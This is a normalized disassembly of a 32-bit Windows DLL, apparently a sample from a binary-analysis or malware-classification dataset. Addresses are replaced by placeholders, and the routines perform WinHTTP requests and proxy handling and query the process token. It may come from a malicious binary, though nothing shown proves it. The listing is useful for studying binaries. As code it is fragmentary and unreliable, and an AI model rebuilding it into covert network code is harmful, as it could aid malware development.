sub_10001014
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
push eax
call sub_1000517a
and [ edi + 0x8 ] 0x0
pop ecx
pop esi
retn
call sub_10003fd3
push esi
call sub_10005185
and [ edi + 0x4 ] 0x0
pop ecx
sub_10001040
mov eax [ rw-data ]
push esi
push edi
push 0xc
mov [ ebx + 0x10 ] eax
call sub_10005190
mov esi eax
xor edi edi
pop ecx
cmp esi edi
je r-xdata
xor esi esi
movsx eax [ rw-data ]
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
push rw-data
mov edi eax
call sub_10003f8b
xor edi edi
jmp r-xdata
xor esi esi
movsx eax [ rw-data ]
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
push rw-data
mov edi eax
call sub_10003f8b
xor edi edi
jmp r-xdata
push 0xc
mov [ ebx ] esi
call sub_10005190
mov esi eax
pop ecx
cmp esi edi
je r-xdata
xor esi esi
movsx eax [ rw-data ]
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
push rw-data
mov edi eax
call sub_10003f8b
xor edi edi
jmp r-xdata
push 0xc
mov [ ebx + 0x4 ] esi
call sub_10005190
mov esi eax
pop ecx
cmp esi edi
je r-xdata
xor esi esi
movsx eax [ rw-data ]
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
push rw-data
mov edi eax
call sub_10003f8b
xor edi edi
jmp r-xdata
push 0xc
mov [ ebx + 0x1c ] esi
call sub_10005190
mov esi eax
pop ecx
cmp esi edi
je r-xdata
xor esi esi
movsx eax [ rw-data ]
push edi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
push rw-data
mov edi eax
call sub_10003f8b
jmp r-xdata
push 0xc
mov [ ebx + 0x20 ] esi
call sub_10005190
mov esi eax
pop ecx
cmp esi edi
je r-xdata
mov eax [ ebx ]
mov [ ebx + 0x24 ] esi
call sub_10003fe5
mov eax [ ebx + 0x4 ]
call sub_10003fe5
mov eax [ ebx + 0x1c ]
call sub_10003fe5
mov eax [ ebx + 0x20 ]
call sub_10003fe5
mov eax [ ebx + 0x24 ]
call sub_10003fe5
mov eax [ rw-data ]
mov [ ebx + 0xc ] eax
mov eax [ rw-data ]
mov [ ebx + 0x14 ] eax
mov eax [ rw-data ]
mov esi ebx
mov [ ebx + 0x18 ] eax
call sub_100011ad
pop edi
mov al 0x1
pop esi
retn
sub_100011ad
call sub_10003d99
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
retn
push edi
mov edi 0x400
push edi
call sub_100050f2
push edi
push 0x0
push eax
mov [ esi + 0x8 ] eax
call sub_10005100
push rw-data
push [ esi + 0x8 ]
call sub_1000506e
add esp 0x18
pop edi
sub_1000120f
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005655
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10005185
pop ecx
sub_10001234
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
mov eax 0x80070057
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
pop ebp
retn 0x8
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx 0x7ffffffe
call sub_100012ae
test eax eax
js r-xdata
sub_10001264
push ebp
mov ebp esp
push ebx
mov edx 0x104
push esi
xor ecx ecx
mov esi edx
mov eax edi
xor ebx ebx
cmp esi ecx
jne r-xdata
add eax 0x2
dec esi
jne r-xdata
mov ecx edx
sub ecx esi
mov ebx 0x80070057
jmp r-xdata
cmp [ eax ] cx
je r-xdata
pop ebp
retn 0x4
mov eax edx
sub eax ecx
lea ecx [ edi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_100012ae
pop esi
mov eax ebx
test ebx ebx
pop ebx
js r-xdata
sub_100012ae
push ebp
mov ebp esp
push edi
mov edi eax
xor eax eax
test edi edi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx edx
sub esi ecx
pop esi
pop ebx
test edi edi
jne r-xdata
movzx edx [ esi + ecx ]
test dx dx
je r-xdata
xor edx edx
mov [ ecx ] dx
pop edi
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec ebx
dec edi
jne r-xdata
test ebx ebx
je r-xdata
sub_100012f2
push ebx
xor ebx ebx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x40c ] 0x50
mov [ esi + 0x410 ] bx
mov [ esi + 0xc12 ] bl
push edi
mov [ esi + 0xc18 ] ebx
call sub_10002219
mov [ esi + 0xc14 ] eax
mov [ eax ] eax
mov edi [ esi + 0xc14 ]
mov [ edi + 0x4 ] edi
mov eax 0x1d4c0
mov edi 0x400
push edi
mov [ esi + 0x10f8 ] eax
mov [ esi + 0x10fc ] eax
mov [ esi + 0x1100 ] eax
mov [ esi + 0x1104 ] eax
lea eax [ esi + 0xc ]
push ebx
push eax
mov [ esi + 0xc20 ] ebx
mov [ esi + 0xc24 ] ebx
mov [ esi + 0xc28 ] ebx
mov [ esi + 0x10f4 ] bl
mov [ esi + 0x1108 ] ebx
mov [ esi + 0x110c ] ebx
mov [ esi + 0x1110 ] ebx
mov [ esi + 0x1118 ] ebx
mov [ esi + 0x111c ] ebx
call sub_10005100
push edi
lea eax [ esi + 0x412 ]
push ebx
push eax
call sub_10005100
push edi
lea eax [ esi + 0x812 ]
push ebx
push eax
call sub_10005100
push 0x64
lea eax [ esi + 0xc2c ]
push ebx
push eax
call sub_10005100
push 0x64
lea eax [ esi + 0xc90 ]
push ebx
push eax
call sub_10005100
push edi
lea eax [ esi + 0xcf4 ]
push ebx
push eax
call sub_10005100
add esp 0x48
call [ GetTickCount@IAT ]
push eax
call sub_10005bd8
pop ecx
pop edi
mov eax esi
pop ebx
retn
sub_100013f1
push esi
push edi
mov esi eax
call sub_100019fb
mov eax [ esi + 0xc24 ]
test eax eax
je r-xdata
add esi 0xc14
call sub_100021ec
pop edi
pop esi
retn
push eax
call sub_1000517a
and [ esi + 0xc24 ] 0x0
pop ecx
sub_10001420
push esi
push edi
mov esi eax
call sub_100019fb
mov eax [ esi + 0xc24 ]
test eax eax
je r-xdata
and [ esi + 0xc28 ] 0x0
pop edi
pop esi
retn
push eax
call sub_1000517a
and [ esi + 0xc24 ] 0x0
pop ecx
sub_1000144b
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push r--data
push [ ebp + 0x8 ]
call sub_10005c0b
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push [ ebp + 0x8 ]
call sub_10005c0b
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x1110 ] eax
mov [ esi + 0x1110 ] 0x1
sub_1000148e
push ebp
mov ebp esp
sub esp 0xc70
push ebx
push esi
xor eax eax
xor ebx ebx
push 0x206
mov [ ebp - 0x248 ] ax
lea eax [ ebp - 0x246 ]
push ebx
push eax
mov [ ebp - 0x1 ] bl
call sub_10005100
xor eax eax
push 0xa26
mov [ ebp - 0xc70 ] ax
lea eax [ ebp - 0xc6e ]
push ebx
push eax
call sub_10005100
push 0x3c
pop esi
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10005100
push [ ebp + 0x8 ]
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0xc70 ]
mov esi 0x104
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x514
mov [ ebp - 0x38 ] 0x1
call sub_10005a5f
add esp 0x28
lea ecx [ ebp - 0x40 ]
push ecx
push ebx
add eax eax
push eax
push [ ebp + 0x8 ]
call [ WinHttpCrackUrl@IAT ]
test eax eax
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x248 ]
push eax
push esi
lea ecx [ edi + 0xc ]
call sub_10001234
test eax eax
jns r-xdata
cmp [ ebp - 0x34 ] 0x2
mov [ ebp - 0x1 ] 0x1
sete al
mov [ edi + 0x410 ] al
movzx eax [ ebp - 0x28 ]
mov [ edi + 0x40c ] eax
mov [ ebp - 0x1 ] bl
jmp r-xdata
sub_1000156a
push ebp
mov ebp esp
push esi
push 0x400
lea esi [ eax + 0x412 ]
push 0x0
push esi
call sub_10005100
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
push 0x200
call sub_10001234
sub_1000159e
push ebp
mov ebp esp
push esi
push 0x400
lea esi [ eax + 0x812 ]
push 0x0
push esi
call sub_10005100
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
push [ ebp + 0x8 ]
mov ecx esi
push 0x200
call sub_10001234
sub_100015eb
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
push edi
mov esi 0x200
push esi
lea edi [ ecx + 0xcf4 ]
push 0x0
push edi
call sub_10005100
add esp 0xc
push [ ebp + 0x8 ]
mov ecx edi
push esi
call sub_10001234
pop edi
mov al 0x1
pop esi
xor al al
jmp r-xdata
pop ebp
retn 0x4
sub_10001624
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
push 0x32
lea esi [ ecx + 0xc2c ]
push 0x0
push esi
call sub_10005100
add esp 0xc
push [ ebp + 0x8 ]
mov ecx esi
push 0x32
call sub_10001234
mov al 0x1
pop esi
xor al al
jmp r-xdata
pop ebp
retn 0x4
sub_10001658
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
push 0x32
lea esi [ ecx + 0xc90 ]
push 0x0
push esi
call sub_10005100
add esp 0xc
push [ ebp + 0x8 ]
mov ecx esi
push 0x32
call sub_10001234
mov al 0x1
pop esi
xor al al
jmp r-xdata
pop ebp
retn 0x4
sub_1000168c
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rw-data ]
push ebx
push edi
xor ebx ebx
push 0x103
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x127 ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x128 ] bl
call sub_10005100
mov [ ebp - 0x20 ] bl
xor eax eax
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
add esp 0xc
stosb [ edi ]
push 0xc
pop edi
lea ebx [ ebp - 0x20 ]
call sub_10004074
mov eax ebx
push eax
push [ esi + 0x111c ]
lea eax [ ebp - 0x128 ]
push [ esi + 0x1118 ]
push [ ebp - 0x8 ]
push r--data
push eax
call sub_1000506e
mov eax [ ebp + 0x8 ]
mov ebx [ eax ]
mov edi [ ebx ]
add edi edi
push edi
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] edi
call sub_100050f2
add esp 0x1c
push edi
push 0x0
push eax
mov [ ebp - 0xc ] eax
call sub_10005100
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebx ]
mov eax [ ebp + 0x8 ]
push [ eax ]
mov ebx [ ebp - 0xc ]
call sub_1000421c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_100044d1
mov edi eax
pop ecx
test edi edi
je r-xdata
test edi edi
je r-xdata
push ebx
call sub_1000517a
pop ecx
test ebx ebx
je r-xdata
push [ ebp - 0x8 ]
mov eax esi
push ebx
push edi
call sub_10001f81
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
push edi
call sub_1000517a
pop ecx
sub_10001782
push ebp
mov ebp esp
sub esp 0x124
push ebx
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x11f ]
push ebx
push eax
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x120 ] bl
call sub_10005100
mov [ ebp - 0x14 ] bl
xor eax eax
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
add esp 0xc
stosb [ edi ]
push 0xc
pop edi
lea ebx [ ebp - 0x14 ]
call sub_10004074
mov eax ebx
push eax
push [ esi + 0x111c ]
lea eax [ ebp - 0x120 ]
push [ esi + 0x1118 ]
push [ ebp + 0x8 ]
push r--data
push eax
call sub_1000506e
lea eax [ ebp - 0x120 ]
push eax
call sub_100044d1
mov edi eax
add esp 0x1c
test edi edi
jne r-xdata
push 0x0
push 0x0
push edi
mov eax esi
call sub_10001f81
push edi
mov [ ebp - 0x1 ] al
call sub_1000517a
pop ecx
push r--data
call [ OutputDebugStringA@IAT ]
jmp r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
sub_10001828
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_100019ed
cmp eax 0xc8
jne r-xdata
xor al al
mov eax [ ebp + 0x8 ]
call sub_100019f4
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
pop ebp
retn 0x4
sub_10001850
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor ebx ebx
mov edi eax
mov [ ebp - 0x1 ] bl
cmp [ edi + 0xc28 ] ebx
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn 0x4
mov eax [ edi + 0xc24 ]
cmp eax ebx
je r-xdata
push 0x23
push eax
mov [ ebp - 0x10 ] ebx
call sub_10005980
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push esi
mov esi [ edi + 0xc28 ]
sub esi [ ebp - 0x10 ]
lea eax [ esi + 0x2 ]
push eax
call sub_100050f2
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
inc eax
push eax
call sub_10005a54
pop ecx
push 0x64
cdq
pop ecx
idiv ecx
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x2 ]
push eax
push ebx
push [ ebp - 0xc ]
call sub_10005100
mov eax [ edi + 0xc24 ]
add eax [ ebp - 0x10 ]
push esi
push eax
push [ ebp - 0xc ]
call sub_10005210
add esp 0x18
cmp esi 0x4
jb r-xdata
mov [ ebp - 0x1 ] bl
jmp r-xdata
push [ ebp - 0xc ]
call sub_1000517a
pop ecx
push 0x4
push [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_10005210
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp esi eax
jae r-xdata
pop esi
add eax 0x2
push eax
call sub_100050f2
mov edi eax
pop ecx
mov [ ebp - 0x10 ] edi
cmp edi ebx
je r-xdata
mov [ ebp - 0x1 ] bl
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x2
push eax
push ebx
push edi
call sub_10005100
push [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
add eax 0x4
push eax
push edi
call sub_10005210
mov eax [ ebp - 0x8 ]
add eax eax
push eax
call sub_100050f2
mov esi eax
mov eax [ ebp - 0x8 ]
add eax eax
push eax
push ebx
push esi
call sub_10005100
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
push esi
push edi
call sub_10004375
add esp 0x34
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x8
push ebx
push edi
call sub_10005100
add esp 0xc
push [ esi ]
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
push [ esi ]
push ebx
push eax
call sub_10005100
push 0x12
push esi
push [ edi ]
call sub_10005210
mov eax [ esi ]
add esp 0x18
cmp eax 0x12
jbe r-xdata
push [ ebp - 0x10 ]
call sub_1000517a
pop ecx
push esi
call sub_1000517a
pop ecx
mov [ ebp - 0x1 ] 0x1
add eax 0xffffffee
push eax
lea eax [ esi + 0x12 ]
push eax
mov eax [ edi ]
add eax 0x12
push eax
call sub_10005210
add esp 0xc
sub_100019fb
mov eax [ esi + 0x8 ]
push edi
mov edi [ WinHttpCloseHandle@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x8 ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call edi
and [ esi + 0x4 ] 0x0
pop edi
retn
push eax
call edi
and [ esi ] 0x0
sub_10001a2c
push ebp
mov ebp esp
push ecx
push esi
xor edx edx
push edx
lea eax [ ecx + 0x110c ]
lea esi [ ebp - 0x4 ]
push esi
push eax
push edx
push 0x20000013
push [ ecx + 0x8 ]
mov [ eax ] edx
mov [ ebp - 0x4 ] 0x4
call [ WinHttpQueryHeaders@IAT ]
pop esi
leave
retn
sub_10001a5a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov edi [ WinHttpQueryHeaders@IAT ]
xor ebx ebx
push ebx
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x16
push [ esi + 0x8 ]
mov [ ebp - 0x4 ] ebx
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
push 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_100050f2
mov ecx [ ebp - 0x4 ]
add ecx ecx
push ecx
push ebx
push eax
mov [ ebp - 0x8 ] eax
call sub_10005100
add esp 0x10
push ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x8 ]
push ebx
push 0x16
push [ esi + 0x8 ]
call edi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push [ ebp - 0x8 ]
call sub_1000517a
pop ecx
mov [ ebp - 0x8 ] 0x1
mov eax [ ebp - 0x4 ]
xor ecx ecx
push 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_100050f2
mov ecx [ ebp - 0x4 ]
add ecx ecx
push ecx
push ebx
push eax
mov [ esi + 0xc20 ] eax
call sub_10005100
mov ecx [ esi + 0xc20 ]
add esp 0x10
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_10001234
cmp [ ebp - 0x8 ] ebx
pop edi
setne al
pop ebx
leave
retn
sub_10001b26
push ebp
mov ebp esp
sub esp 0x14
mov eax [ esi + 0xc24 ]
push ebx
xor ebx ebx
push edi
mov edi 0x2800
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] ebx
cmp eax ebx
je r-xdata
push edi
call sub_100050f2
pop ecx
mov [ esi + 0xc24 ] eax
test eax eax
je r-xdata
push eax
call sub_1000517a
and [ esi + 0xc24 ] ebx
pop ecx
xor al al
push edi
push 0x0
push eax
call sub_10005100
add esp 0xc
mov [ esi + 0xc28 ] ebx
mov al 0x1
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop ebx
leave
retn
mov eax [ ebp - 0x4 ]
inc eax
push eax
call sub_100050f2
mov edi eax
pop ecx
mov [ ebp - 0x14 ] edi
test edi edi
je r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x1108 ] eax
mov eax [ ebp - 0x4 ]
inc eax
push eax
push 0x0
push edi
call sub_10005100
and [ ebp - 0x8 ] 0x0
add esp 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push edi
push [ esi + 0x8 ]
call [ WinHttpReadData@IAT ]
test eax eax
je r-xdata
push edi
call sub_1000517a
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
add ecx ebx
cmp ecx eax
jbe r-xdata
push [ ebp - 0x8 ]
mov eax [ esi + 0xc24 ]
add eax ebx
push edi
push eax
call sub_10005210
add ebx [ ebp - 0x8 ]
push edi
mov [ ebp - 0xc ] ebx
call sub_1000517a
add esp 0x10
cmp [ ebp - 0x4 ] 0x0
ja r-xdata
mov edi [ esi + 0xc24 ]
lea ebx [ eax + eax ]
push ebx
call sub_100050f2
pop ecx
mov [ esi + 0xc24 ] eax
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0x8 ]
call [ WinHttpQueryDataAvailable@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0xc ]
push ebx
push 0x0
push eax
mov [ ebp - 0x10 ] ebx
call sub_10005100
push [ ebp - 0xc ]
push edi
push [ esi + 0xc24 ]
call sub_10005210
push edi
call sub_1000517a
mov edi [ ebp - 0x14 ]
mov ebx [ ebp - 0xc ]
add esp 0x1c
sub_10001c7b
push ebp
mov ebp esp
sub esp 0x250
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x5 ] bl
call sub_100020d2
test al al
je r-xdata
push 0x10
lea eax [ ebp - 0x24 ]
push ebx
push eax
call sub_10005100
add esp 0xc
lea eax [ ebp - 0x24 ]
push eax
call [ WinHttpGetIEProxyConfigForCurrentUser@IAT ]
test eax eax
je r-xdata
call sub_10003b6a
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1108 ] eax
mov esi ecx
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov ecx eax
lea ebx [ ebp - 0x44 ]
call sub_100039b6
xor ebx ebx
mov al [ ebp - 0x5 ]
cmp al bl
je r-xdata
lea esi [ ebp - 0x44 ]
call sub_10003b47
mov esi [ ebp + 0x8 ]
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0x18
lea eax [ ebp - 0x3c ]
push ebx
push eax
call sub_10005100
mov ecx [ ebp - 0x20 ]
xor eax eax
add esp 0xc
inc eax
push 0xc
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push ebx
push eax
mov [ ebp - 0x3c ] 0x3
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x30 ] ebx
call sub_10005100
add esp 0xc
xor eax eax
push 0x206
mov [ ebp - 0x24c ] ax
lea eax [ ebp - 0x24a ]
push ebx
push eax
call sub_10005100
mov esi [ ebp + 0x8 ]
add esp 0xc
mov edx 0x7ffffffe
mov eax 0x104
lea ecx [ ebp - 0x24c ]
cmp [ esi + 0x410 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov [ esi + 0x10f4 ] 0x1
mov esi [ ebp + 0x8 ]
push 0xc
lea eax [ ebp - 0x14 ]
push ebx
push eax
call sub_10005100
add esp 0xc
xor eax eax
push 0x206
mov [ ebp - 0x24c ] ax
lea eax [ ebp - 0x24a ]
push ebx
push eax
mov [ ebp - 0x14 ] 0x3
call sub_10005100
add esp 0xc
push [ ebp - 0x1c ]
lea eax [ ebp - 0x24c ]
push 0x104
push eax
call sub_10005c7a
add esp 0xc
lea eax [ ebp - 0x24c ]
mov [ ebp - 0x10 ] eax
push 0xc
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x26
push [ eax + 0x8 ]
call [ WinHttpSetOption@IAT ]
test eax eax
je r-xdata
push r--data
jmp r-xdata
push r--data
call sub_100020d2
test al al
je r-xdata
push [ ebp - 0x18 ]
call [ GlobalFree@IAT ]
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push [ eax ]
mov eax [ ebp + 0x8 ]
push ebx
push ebx
push ebx
push ebx
push [ eax + 0x8 ]
call [ WinHttpSendRequest@IAT ]
test eax eax
setne [ ebp - 0x5 ]
call sub_100012ae
cmp eax ebx
jl r-xdata
mov [ ebp - 0x5 ] bl
lea eax [ esi + 0xc ]
push eax
lea edi [ ebp - 0x24c ]
call sub_10001264
test eax eax
js r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ GlobalFree@IAT ]
push [ ebp + 0xc ]
call sub_10001264
test eax eax
js r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ GlobalFree@IAT ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax edi
push eax
push [ esi ]
call [ WinHttpGetProxyForUrl@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x1108 ] eax
jmp r-xdata
push 0xc
lea eax [ ebp - 0x14 ]
push eax
push 0x26
push [ esi + 0x8 ]
call [ WinHttpSetOption@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
push ebx
push [ eax ]
push ebx
push ebx
push ebx
push ebx
push [ esi + 0x8 ]
call [ WinHttpSendRequest@IAT ]
test eax eax
setne [ ebp - 0x5 ]
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x10 ]
call [ GlobalFree@IAT ]
push [ ebp - 0xc ]
call [ GlobalFree@IAT ]
jmp r-xdata
sub_10001f0b
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ esi + 0x412 ]
push eax
call [ WinHttpOpen@IAT ]
mov [ esi ] eax
cmp eax ebx
jne r-xdata
call sub_100019fb
push [ esi + 0x1104 ]
push [ esi + 0x1100 ]
push [ esi + 0x10fc ]
push [ esi + 0x10f8 ]
push eax
call [ WinHttpSetTimeouts@IAT ]
movzx eax [ esi + 0x40c ]
push ebx
push eax
lea eax [ esi + 0xc ]
push eax
push [ esi ]
call [ WinHttpConnect@IAT ]
mov [ esi + 0x4 ] eax
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x1108 ] eax
jmp r-xdata
pop esi
mov al bl
pop ebx
retn
mov bl 0x1
sub_10001f81
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi eax
push edi
xor eax eax
mov [ ebp - 0x10 ] ax
lea edi [ ebp - 0xe ]
stosd [ edi ]
stosd [ edi ]
xor ebx ebx
stosw [ edi ]
mov edx 0x7ffffffe
lea ecx [ ebp - 0x10 ]
cmp [ esi + 0x1110 ] ebx
jne r-xdata
push r--data
push r--data
jmp r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn 0xc
mov eax 0x100
cmp [ esi + 0x410 ] bl
je r-xdata
push 0x6
pop eax
call sub_100012ae
mov eax esi
call sub_10001f0b
test al al
je r-xdata
push eax
lea edi [ esi + 0x812 ]
push ebx
push edi
call sub_10005a5f
pop ecx
xor ecx ecx
cmp ecx eax
sbb eax eax
and eax edi
push eax
push ebx
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x4 ]
call [ WinHttpOpenRequest@IAT ]
mov [ esi + 0x8 ] eax
cmp eax ebx
je r-xdata
mov eax 0x800100
cmp [ esi + 0x411 ] bl
jne r-xdata
mov edi [ GetLastError@IAT ]
cmp [ esi + 0x10f4 ] bl
jne r-xdata
cmp [ esi + 0x410 ] bl
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
push esi
call sub_10001c7b
cmp al bl
je r-xdata
push ebx
push [ ebp + 0x10 ]
mov [ esi + 0x10f4 ] bl
push ebx
push ebx
push ebx
push ebx
push [ esi + 0x8 ]
call [ WinHttpSendRequest@IAT ]
test eax eax
jne r-xdata
push 0x4
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1f
push eax
mov [ ebp - 0x4 ] 0x3100
call [ WinHttpSetOption@IAT ]
cmp [ ebp + 0xc ] ebx
je r-xdata
call edi
mov [ esi + 0x1108 ] eax
push ebx
push [ esi + 0x8 ]
call [ WinHttpReceiveResponse@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_10001a5a
mov ecx esi
call sub_10001a2c
call sub_10001b26
mov bl 0x1
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
mov [ ebp + 0x8 ] ebx
push [ ebp + 0xc ]
push [ esi + 0x8 ]
call [ WinHttpWriteData@IAT ]
test eax eax
jne r-xdata
call edi
mov [ esi + 0x1108 ] eax
sub_100020d2
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push edi
xor ebx ebx
mov esi 0x103
push esi
lea eax [ ebp - 0x21f ]
push ebx
push eax
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x220 ] bl
call sub_10005100
push esi
lea eax [ ebp - 0x11b ]
push ebx
push eax
mov [ ebp - 0x11c ] bl
call sub_10005100
push esi
lea eax [ ebp - 0x323 ]
push ebx
push eax
mov [ ebp - 0x324 ] bl
call sub_10005100
lea eax [ esi - 0x3b ]
add esp 0x24
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
call [ GetCurrentProcess@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x8
push edi
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1 ] bl
jmp r-xdata
mov esi [ CloseHandle@IAT ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x104
lea eax [ ebp - 0x220 ]
push eax
push 0x1
push [ ebp - 0x8 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
call esi
